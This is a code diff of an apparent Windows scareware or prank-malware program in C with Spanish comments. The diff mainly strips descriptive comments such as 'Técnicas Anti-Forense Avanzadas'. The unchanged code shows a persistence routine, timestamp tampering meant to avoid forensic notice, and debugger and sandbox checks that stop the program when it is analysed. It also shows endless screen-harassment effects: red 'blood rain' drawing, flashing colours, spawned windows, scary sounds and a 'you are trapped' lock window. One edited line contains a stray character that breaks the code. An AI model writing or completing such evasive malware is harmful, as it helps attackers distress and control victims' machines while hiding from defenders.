@@ -27,7 +27,6 @@ void setPersistence() {
     }
 }
 
-// **Técnicas Anti-Forense Avanzadas**:
 
 // Modificar las fechas de acceso/creación para que el archivo no se vea sospechoso.
 void modifyTimestamps() {
@@ -42,7 +41,6 @@ void modifyTimestamps() {
     }
 }
 
-// **Técnicas Anti-Debugging Avanzadas**:
 
 // Detección más avanzada de herramientas de depuración.
 bool isDebuggerPresent() {
@@ -80,9 +78,6 @@ bool isSandbox() {
     return false;
 }
 
-// **Efectos visuales aterradores**:
-
-// Lluvia de sangre con más complejidad (más líneas, más interacción con la pantalla).
 void bloodRain() {
     HDC hdc = GetDC(NULL);
     HPEN hPen = CreatePen(PS_SOLID, 2, RGB(255, 0, 0));
@@ -99,7 +94,6 @@ void bloodRain() {
     }
 }
 
-// Pantalla con efectos de parpadeo espeluznantes y colores distorsionados.
 void flashScreen() {
     while (true) {
         system("color 0C");  // Rojo sangre
@@ -113,7 +107,6 @@ void flashScreen() {
     }
 }
 
-// Efectos visuales de distorsión y ventanas rotas.
 void brokenWindowEffect() {
     srand(time(0));
     while (true) {
@@ -124,20 +117,18 @@ void brokenWindowEffect() {
                                  WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                  x, y, 500, 400, NULL, NULL, NULL, NULL);
 
-        // Crear distorsión en la ventana (por ejemplo, grietas, rotaciones)
+    
         for (int i = 0; i < 5; ++i) {
-            SendMessage(hwnd, WM_SIZE, 0, 0);  // Hacer que la ventana cambie de tamaño
-            Sleep(300);  // Distorsionar la ventana rápidamente
+            SendMessage(hwnd, WM_SIZE, 0, 0);  
+            Sleep(300); 
         }
 
-        Sleep(3000);  // Mantener la ventana rota por un tiempo
+        Sleep(3000);  o
         DestroyWindow(hwnd);
     }
 }
 
-// **Efectos de terror adicional**:
 
-// Reproduce sonidos aterradores aleatorios en segundo plano.
 void playScarySounds() {
     mciSendString("open scare1.wav type waveaudio alias sound1", NULL, 0, NULL);
     mciSendString("play sound1 repeat", NULL, 0, NULL);
@@ -151,9 +142,6 @@ void playScarySounds() {
     }
 }
 
-// **Mostrar imágenes aterradoras**:
-
-// Mostrar imágenes espeluznantes en pantallas aleatorias.
 void showScaryImages() {
     while (true) {
         HWND hwnd = CreateWindow("STATIC", "Imagen Aterradora", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
@@ -165,19 +153,16 @@ void showScaryImages() {
     }
 }
 
-// Bloquear la pantalla con un mensaje aterrador.
 void lockScreen() {
     HWND hwnd = CreateWindow("STATIC", "¡ESTÁS ATRAPADO! No puedes salir.",
                              WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 500, 400, NULL, NULL, NULL, NULL);
 
     while (true) {
-        // Cambiar el mensaje para hacerlo más aterrador.
+     
         SetWindowText(hwnd, "¡ES DEMASIADO TARDE PARA ESCAPAR!");
         Sleep(1000);
     }
 }
-
-// **Función principal**:
 
 int main() {
     if (isDebuggerPresent() || checkDebuggerTools() || isSandbox()) {
